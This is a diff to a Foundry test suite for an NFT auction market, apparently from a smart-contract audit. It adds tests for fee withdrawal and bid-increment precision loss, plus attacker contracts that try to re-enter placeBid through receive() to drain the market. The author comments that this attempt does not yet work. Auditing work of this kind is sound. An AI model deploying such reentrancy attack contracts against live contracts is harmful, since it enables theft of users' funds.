@@ -30,7 +30,7 @@ contract BidBeastsNFTMarketTest is Test {
 
     function setUp() public {
         // Deploy contracts
-        vm.prank(OWNER);
+        vm.startPrank(OWNER);
         nft = new BidBeasts();
         market = new BidBeastsNFTMarket(address(nft));
         rejector = new RejectEther();
@@ -126,6 +126,12 @@ contract BidBeastsNFTMarketTest is Test {
     //     assertEq(highestBid.amount, secondBidAmount, "New highest bid amount is incorrect");
     // }
 
+    function _placeBid(address user, uint256 tokenId, uint256 amount) private {
+        vm.startPrank(user);
+        market.placeBid{value: amount}(tokenId);
+        vm.stopPrank();
+    }
+
     function test_canBidAndWinAuction() public {
         // setup context
         _mintNFT();
@@ -152,11 +158,13 @@ contract BidBeastsNFTMarketTest is Test {
         highestBid = market.getHighestBid(TOKEN_ID);
         console.log("round 2: balance bidder 1 after placeBid: %e", BIDDER_1.balance);
         console.log("round 2: balance bidder 2 after placeBid: %e", BIDDER_2.balance);
-        _requireAmountTesting(highestBid.amount);
-        _timeLeft(TOKEN_ID);
         assertEq(highestBid.bidder, BIDDER_2, "round 2: highestBid.bidder should be bidder 2");
         assertEq(highestBid.amount, secondBidAmount, "round 2: highestBid.amount should be second bid amount");
         assertEq(BIDDER_2.balance, bidder2BalanceBefore - secondBidAmount, "round 2: balance bidder2 should decrease");
+
+        highestBid = market.getHighestBid(TOKEN_ID);
+        _timeLeft(TOKEN_ID);
+
         // 3rd round - above buy now, should win the nft
         address winner = makeAddr("winner");
         vm.deal(winner, STARTING_BALANCE);
@@ -178,18 +186,6 @@ contract BidBeastsNFTMarketTest is Test {
             "round 3: balance bidder2 should decrease"
         );
         assertEq(nft.ownerOf(TOKEN_ID), winner, "round 3: owner of nft should be winner");
-    }
-
-    // test bid increment
-    function _requireAmountTesting(uint256 _prevBidAmount) private view {
-        uint256 requiredAmount = (_prevBidAmount / 100) * (100 + market.S_MIN_BID_INCREMENT_PERCENTAGE());
-        uint256 minIncrement = market.S_MIN_BID_INCREMENT_PERCENTAGE() * 100;
-        // using basis points for rounding up
-        uint256 refReqAmount = (_prevBidAmount * minIncrement) / 10000;
-        uint256 newReqAmount = _prevBidAmount + refReqAmount;
-
-        console.log("prevBidAmount: %e, requiredAmount: %e", _prevBidAmount, requiredAmount);
-        console.log("refReqAmount: %e, newReqAmount: %e", refReqAmount, newReqAmount);
     }
 
     // test bid time
@@ -258,6 +254,85 @@ contract BidBeastsNFTMarketTest is Test {
             "Attack contract should have funds higher than first bid, which means a successfull attack."
         );
     }
+
+    function test_feesFromASale() public {
+        // setup context
+        _mintNFT();
+        _listNFT();
+        // 1st round - place bid by bidder 1
+        uint256 firstBidAmount = 2 ether;
+        vm.startPrank(BIDDER_1);
+        market.placeBid{value: firstBidAmount}(TOKEN_ID);
+        vm.stopPrank();
+        // 2nd bid - buy now
+        vm.startPrank(BIDDER_2);
+        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
+        vm.stopPrank();
+        console.log("bid1: %e, buynow: %e", firstBidAmount, BUY_NOW_PRICE);
+        console.log("balance seller after buy now: %e", SELLER.balance);
+        console.log("balance bidder 1 after buy now: %e", BIDDER_1.balance);
+        console.log("balance bidder 2 after buy now: %e", BIDDER_2.balance);
+        console.log("balance MARKET after buy now: %e", address(market).balance);
+        console.log("MARKET FEE after buy now: %e", market.s_totalFee());
+        vm.prank(OWNER);
+        market.withdrawFee();
+        vm.stopPrank();
+        console.log("balance MARKET after withdraw fee: %e", address(market).balance);
+        console.log("MARKET FEE after withdraw fee: %e", market.s_totalFee());
+        console.log("MARKET owner: %s", market.owner());
+        console.log("balance market owner after withdraw fee: %e", OWNER.balance);
+
+        vm.startPrank(BIDDER_2);
+        market.placeBid{value: BUY_NOW_PRICE}(1);
+        vm.stopPrank();
+    }
+
+    function test_reentrancy_placeBid() public {
+        // setup context
+        _mintNFT();
+        _listNFT();
+        deal(address(market), STARTING_BALANCE); // lets pretend the market has a lot of funds
+        // setup the attacker
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.deal(attacker, STARTING_BALANCE);
+        BuyNowAttack sc_buyNowAttack;
+        sc_buyNowAttack = new BuyNowAttack(market);
+        // transfer funds to attack contract so it can perform the attack
+        (bool success,) = address(sc_buyNowAttack).call{value: BUY_NOW_PRICE * 4}(""); // 4 times the buy now price
+        assertEq(success, true, "attack contract failed to receive funds");
+        // 1. place first bid as attack contract
+        sc_buyNowAttack.placeBid(TOKEN_ID);
+        sc_buyNowAttack.attack();
+        vm.stopPrank();
+
+        console.log("MARKET BALANCE after attack: %e", address(market).balance);
+        console.log("sc_attack balance after attack: %e", address(sc_buyNowAttack).balance);
+    }
+
+    function test_requiredAmount() public {
+        // setup context
+        _mintNFT();
+        // list the nft with minimum bid price
+        vm.startPrank(SELLER);
+        nft.approve(address(market), TOKEN_ID);
+        market.listNFT(TOKEN_ID, 0.01 ether, BUY_NOW_PRICE);
+        vm.stopPrank();
+        // place a bid with min bid price plus 1 wei, so we can prove how the precision for that 1 wei is lost
+        _placeBid(BIDDER_1, TOKEN_ID, 0.01 ether + 1);
+        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
+        uint256 markeBidtIncrement = market.S_MIN_BID_INCREMENT_PERCENTAGE();
+        uint256 prevBidAmount = highestBid.amount;
+        // required amount actual code base calculation
+        uint256 requiredAmount = (prevBidAmount / 100) * (100 + markeBidtIncrement);
+
+        // correct formula
+        uint256 correctRequiredAmountformula = (prevBidAmount * (100 + markeBidtIncrement)) / 100;
+
+        console.log("prevBidAmount: %e", prevBidAmount);
+        console.log("requiredAmount: %e", requiredAmount);
+        console.log("correctRequiredAmountformula: %e", correctRequiredAmountformula);
+    }
 }
 
 // can place bid, but can't recive funds
@@ -323,6 +398,106 @@ contract WithdrawFailedCreditsAttack {
         (bool success,) = payable(owner).call{value: address(this).balance}("");
         if (!success) {
             revert WithdrawFailedCreditsAttack__WithdrawFailed();
+        }
+    }
+}
+
+contract BuyNowAttackHelper {
+    BidBeastsNFTMarket public immutable i_market;
+    address private immutable owner;
+
+    error BuyNowAttackHelper__WithdrawFailed();
+    error BuyNowAttackHelper__OnlyOwner();
+
+    constructor(BidBeastsNFTMarket _market) {
+        i_market = _market;
+        owner = msg.sender;
+    }
+
+    function helperPlaceBid(uint256 tokenId) external payable {
+        i_market.placeBid{value: msg.value}(tokenId);
+    }
+
+    // simple function to allow withdraw of funds from contract to owner
+    function helperWithdraw(address to) external {
+        if (msg.sender != owner) {
+            revert BuyNowAttackHelper__OnlyOwner();
+        }
+        (bool success,) = payable(to).call{value: address(this).balance}("");
+        if (!success) {
+            revert BuyNowAttackHelper__WithdrawFailed();
+        }
+    }
+}
+
+// useless for now, cant prove my point
+// tried to reentrant on buyNow logic
+contract BuyNowAttack {
+    BidBeastsNFTMarket public immutable i_market;
+    BuyNowAttackHelper public immutable i_helper;
+    address private immutable owner;
+
+    uint256 public currentTokenId;
+    uint256 public currentTokenIdBuyNowPrice;
+    uint256 public currentTokenIdMinPrice;
+
+    error BuyNowAttack__WithdrawFailed();
+    error BuyNowAttack__TokenIdNotListed(uint256 tokenId);
+    error BuyNowAttack__ZeroBuyNowPrice(uint256 tokenId);
+    error BuyNowAttack__NotEnoughBalanceInContract(uint256 requiredAmount);
+
+    constructor(BidBeastsNFTMarket _market) {
+        i_market = _market;
+        owner = msg.sender;
+        i_helper = new BuyNowAttackHelper(i_market);
+    }
+
+    // needed to enter the bid, so we can become the previous bidder
+    function placeBid(uint256 tokenId) public {
+        BidBeastsNFTMarket.Listing memory listing = i_market.getListing(tokenId);
+        if (!listing.listed) {
+            revert BuyNowAttack__TokenIdNotListed(tokenId);
+        }
+        uint256 buyNowPrice = listing.buyNowPrice;
+        uint256 minPrice = listing.minPrice;
+        if (buyNowPrice == 0) {
+            revert BuyNowAttack__ZeroBuyNowPrice(tokenId);
+        }
+        if (address(this).balance < buyNowPrice) {
+            revert BuyNowAttack__NotEnoughBalanceInContract(buyNowPrice);
+        }
+
+        currentTokenId = tokenId;
+        currentTokenIdBuyNowPrice = buyNowPrice;
+        currentTokenIdMinPrice = minPrice;
+
+        i_market.placeBid{value: getMinPrice(tokenId)}(tokenId);
+    }
+
+    function attack() public {
+        // i_market.placeBid{value: currentTokenIdBuyNowPrice + 1}(currentTokenId);
+        i_helper.helperPlaceBid{value: getMinPrice(currentTokenId)}(currentTokenId);
+    }
+
+    function getMinPrice(uint256 tokenId) public view returns (uint256 minPriceWithIncrement) {
+        BidBeastsNFTMarket.Listing memory listing = i_market.getListing(tokenId);
+        uint256 minPrice = listing.minPrice;
+        uint256 minBidIncrement = i_market.S_MIN_BID_INCREMENT_PERCENTAGE();
+        uint256 bidIncrement = (minPrice * minBidIncrement) / 100;
+        minPriceWithIncrement = minPrice + bidIncrement;
+    }
+
+    receive() external payable {
+        if (currentTokenIdBuyNowPrice > 0 && address(i_market).balance > currentTokenIdMinPrice) {
+            attack();
+        }
+    }
+
+    // simple function to allow withdraw of funds from contract to owner
+    function withdraw() external {
+        (bool success,) = payable(owner).call{value: address(this).balance}("");
+        if (!success) {
+            revert BuyNowAttack__WithdrawFailed();
         }
     }
 }
